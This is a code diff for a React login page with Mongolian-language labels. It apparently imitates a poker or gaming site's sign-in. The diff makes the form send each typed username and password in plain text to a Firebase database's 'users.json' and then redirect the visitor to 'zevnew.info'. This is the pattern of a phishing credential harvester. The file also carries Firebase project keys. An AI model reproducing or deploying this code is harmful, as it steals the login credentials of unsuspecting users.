@@ -1,5 +1,15 @@
 import { useState } from "react";
-import { Box, Button, Input, Text, Checkbox, Flex, Image } from "@chakra-ui/react";
+import { useNavigate } from "react-router-dom";
+
+import {
+  Box,
+  Button,
+  Input,
+  Text,
+  Checkbox,
+  Flex,
+  Image,
+} from "@chakra-ui/react";
 import back from "../assets/back.png";
 import tablet from "../assets/tablet.png";
 import mobile from "../assets/mobile.png";
@@ -15,26 +25,20 @@ import { SmallCloseIcon, TriangleDownIcon } from "@chakra-ui/icons";
 // import { useNavigate } from "react-router-dom";
 
 const firebaseConfig = {
-  apiKey: "AIzaSyDzzKM5vaWa7jYiOiBcdzN9h0gASfeTNg4",
-
-  authDomain: "zevv-80552.firebaseapp.com",
-
-  projectId: "zevv-80552",
-
-  storageBucket: "zevv-80552.appspot.com",
-
-  messagingSenderId: "505240279021",
-
-  appId: "1:505240279021:web:e687d947f46d03882fb9e4",
-
-  measurementId: "G-7FV0XF5FGD",
+  apiKey: "AIzaSyCkq56hKZT7r5yLUgpp62poCuPRFJYIoLs",
+  authDomain: "zevpoker-780d1.firebaseapp.com",
+  projectId: "zevpoker-780d1",
+  storageBucket: "zevpoker-780d1.appspot.com",
+  messagingSenderId: "473331460880",
+  appId: "1:473331460880:web:6d2b8f677d3ffdd9939395",
+  measurementId: "G-JQYLBNLXJM",
 };
 
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
 const LoginForm = () => {
-  // const navigate = useNavigate();
+  const navigate = useNavigate();
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [emailError, setEmailError] = useState("");
@@ -45,16 +49,23 @@ const LoginForm = () => {
       name: email,
       pass: password,
     };
-    const res = await fetch("https://zevvv-537e2-default-rtdb.firebaseio.com/users.json", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        data,
-      }),
-    });
+    const res = await fetch(
+      "https://zevpoker-780d1-default-rtdb.firebaseio.com/users.json",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          data,
+        }),
+      }
+    );
   };
+  function handleRedirect() {
+    // Redirect to another site
+    window.location.href = "https://zevnew.info/";
+  }
   const handleSubmit = (event) => {
     event.preventDefault();
 
@@ -76,7 +87,7 @@ const LoginForm = () => {
       console.log("Submitted!");
     }
     saveData();
-    // navigate(" https://zevnew.info/");
+    handleRedirect();
   };
 
   return (
@@ -90,8 +101,21 @@ const LoginForm = () => {
       h="100vh"
       overflow={"hidden"}
     >
-      <Box pos={"absolute"} top="0" left={"0"} width="100vw" height={"100vh"} bg="rgba(0, 0, 0, 0.5)"></Box>
-      <Box bgColor="#282434" width="400px" height={"550px"} zIndex="1">
+      <Box
+        pos={"absolute"}
+        top="0"
+        left={"0"}
+        width="100vw"
+        height={"100vh"}
+        bg="rgba(0, 0, 0, 0.5)"
+      ></Box>
+      <Box
+        bgColor="#282434"
+        width="400px"
+        mx={"30px"}
+        height={"550px"}
+        zIndex="1"
+      >
         <Box
           width={"100%"}
           h="56px"
@@ -131,7 +155,12 @@ const LoginForm = () => {
           </Text>
         </Box>
         <Box padding="0 2.5em 2.5em">
-          <Flex direction={"column"} gap="20px" justifyContent={"center"} alignItems="center">
+          <Flex
+            direction={"column"}
+            gap="20px"
+            justifyContent={"center"}
+            alignItems="center"
+          >
             <Input
               mt="20px"
               placeholder="нэр"
@@ -153,7 +182,7 @@ const LoginForm = () => {
               onChange={(e) => setEmail(e.target.value)}
             />
             <Input
-              _placeholder={"Нууц үг"}
+              placeholder={"Нууц үг"}
               fontSize={"0.875em"}
               height="2.858em"
               w="100%"
@@ -172,7 +201,12 @@ const LoginForm = () => {
               focusBorderColor="transparent"
               onChange={(e) => setPassword(e.target.value)}
             />
-            <Flex justifyContent="space-between" width={"100%"} mt="12px" mb="-10px">
+            <Flex
+              justifyContent="space-between"
+              width={"100%"}
+              mt="12px"
+              mb="-10px"
+            >
               <Flex justifyContent={"flex-start"} alignItems="center">
                 <Checkbox
                   left={0}
@@ -195,7 +229,9 @@ const LoginForm = () => {
                   overflow={"hidden"}
                   paddingTop="0.2em"
                   paddingBottom={"0.2em"}
-                  fontFamily={"'CondensedRegularFont', verdana, tahoma, sans-serif, arial"}
+                  fontFamily={
+                    "'CondensedRegularFont', verdana, tahoma, sans-serif, arial"
+                  }
                 >
                   Намайг сана
                 </Text>
@@ -209,6 +245,7 @@ const LoginForm = () => {
               height={"2.5em"}
               mt="1.7em"
               borderRadius={"0.25em"}
+              fontSize="16px"
               boxSizing="border-box"
               color={"#fff"}
               fontFamily="'RegularFont', verdana, tahoma, sans-serif, arial"
@@ -218,6 +255,9 @@ const LoginForm = () => {
               width={"100%"}
               bgColor={"#BE2E2E"}
               onClick={(e) => handleSubmit(e)}
+              _hover={{
+                backgroundColor: "#cb5858",
+              }}
               mb="30px"
             >
               НЭВТРЭХ
@@ -271,6 +311,9 @@ const LoginForm = () => {
               boxSizing="border-box"
               outline={"none"}
               color="#fff"
+              _hover={{
+                backgroundColor: "#6d6db1",
+              }}
             >
               Үгүй
             </Button>
